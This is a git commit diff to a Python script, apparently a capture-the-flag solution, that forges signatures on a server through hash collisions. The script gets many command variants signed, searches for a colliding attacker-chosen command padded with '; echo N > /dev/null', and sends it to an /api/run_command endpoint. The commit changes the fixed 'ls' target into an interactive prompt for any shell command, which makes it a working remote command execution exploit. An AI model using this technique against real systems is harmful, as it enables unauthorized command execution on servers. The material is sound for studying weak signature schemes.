f4424c9e5e20990fed2cfaa0e7c662ee2dde9fe4
Clayton Smith <argilo@gmail.com>
2019-11-09 20:10:13 -0500

    Take commands from the user

--- hash/collide.py
+++ hash/collide.py
@@ -4,7 +4,7 @@ import base64
 import hashlib
 import urllib.request
 
-target_command = "ls"
+server = "localhost:5000"
 
 
 def hash(message):
@@ -15,21 +15,24 @@ with urllib.request.urlopen(f"http://localhost:5000/?text=foobar") as f:
     cmd = f.read().decode().split('data-command="')[1].split('"')[0]
 
 seen = {}
-for x in range(0x1000000):
+for x in range(0x2000000):
     h = hash(cmd.replace("foobar", str(x)).encode())
     seen[h] = x
 
-x = 0
 while True:
-    command = f"{target_command} ; echo {x} > /dev/null"
-    h = hash(command.encode())
-    if h in seen:
-        break
-    x += 1
+    target_command = input("Command? ")
 
-with urllib.request.urlopen(f"http://localhost:5000/?text={seen[h]}") as f:
-    sig = f.read().decode().split('data-signature="')[1].split('"')[0]
+    x = 0
+    while True:
+        command = f"{target_command} ; echo {x} > /dev/null"
+        h = hash(command.encode())
+        if h in seen:
+            break
+        x += 1
 
-data = urllib.parse.urlencode({"command": command, "signature": sig}).encode()
-with urllib.request.urlopen("http://localhost:5000/api/run_command", data) as f:
-    print(base64.b64decode(f.read().split(b",")[1]).decode())
+    with urllib.request.urlopen(f"http://{server}/?text={seen[h]}") as f:
+        sig = f.read().decode().split('data-signature="')[1].split('"')[0]
+
+    data = urllib.parse.urlencode({"command": command, "signature": sig}).encode()
+    with urllib.request.urlopen(f"http://{server}/api/run_command", data) as f:
+        print(base64.b64decode(f.read().split(b",")[1]).decode())
